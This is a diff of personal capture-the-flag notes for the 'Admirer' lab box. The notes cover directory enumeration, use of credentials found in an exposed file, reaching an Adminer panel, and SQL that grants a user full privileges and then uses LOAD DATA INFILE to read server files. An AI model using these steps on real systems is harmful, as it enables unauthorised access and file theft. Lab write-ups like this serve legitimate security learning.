@@ -1,36 +1,5 @@
 * nmap scan showed on port 80 /admin-dir but the dir is Forbidden*
 
-??? a******.p*p ???
-??? A******.p** ???
-
-xxx admirer.php xxx
-xxx adminer.php xxx
-xxx adminer.php xxx
-xxx admin-r.php xxx
-xxx adminir.php xxx
-xxx adminrr.php xxx
-ccc Ad****r.php ccc
-xxx Admirer.php xxx
-xxx Adminer.php xxx
-xxx Admirer.php xxx
-    admster.php
-    
-
-* Someone on Discord said this is the correct one => "adminer.php" *
- 
--- Dirb wordlists --
-* gobuster on '/' with dirb/common.txt *
-
-/.hta (Status: 403)
-/.htaccess (Status: 403)
-/.htpasswd (Status: 403)
-/assets (Status: 301)
-/images (Status: 301)
-/index.php (Status: 200)
-/index.php (Status: 200)
-/robots.txt (Status: 200)
-/server-status (Status: 403)
-
 - robots.txt had some intresting info, also we may have confirmation that /admin-dir has contacts and creds *
     User-agent: *
 
@@ -40,24 +9,12 @@ xxx Admirer.php xxx
 /contacts.txt (Status: 200)
 /credentials.txt (Status: 200)
 
+going to 10.10.10.187/utility-scripts/adminer.php
+gives me the panel
 
-using the ftp user from the credentials.txt is succesful
-the same creds seem to work for ssh according to hydra but when connecting 
-over ssh the connection is closed immidiatly
+CREATE USER 'raftos'@'10.10.10.187' IDENTIFIED BY 'raftos';
+GRANT ALL PRIVILEGES ON *.* TO 'raftos'@'10.10.10.187';
+FLUSH PRIVILEGES;
 
-Someone said this:
-Actually, is not the creds that has a typo. The p*p file you need is something beween
-the name of the machine and the r*****.t** directory.
-Just no "-". This might be a spoiler, but it was the strangest part of the box. 
-PM me for more (as far as I have reached ofc)
-
-
-The list to use is /dirb/big.txt
-and the admin page is most propably adminer.php
-
-
-
-You are definitely on the right track I am guessing you came to the conclusion of Adminer from a Google search of the boxes name. 
-There are tons of rabbit holes in the zip file to throw you off however, it is a backup, and backups tell you a lot about how a developer has structured their site. 
-So continue your enumeration as normal but think about which directory would be the most interesting poke around at. 
-I think I am basically spoiling it at this point but let me know if you have anymore questions.
+exists, seems like the default apache page
+LOAD DATA INFILE '/var/www/html/index.html' INTO TABLE test FIELDS TERMINATED BY '\r';
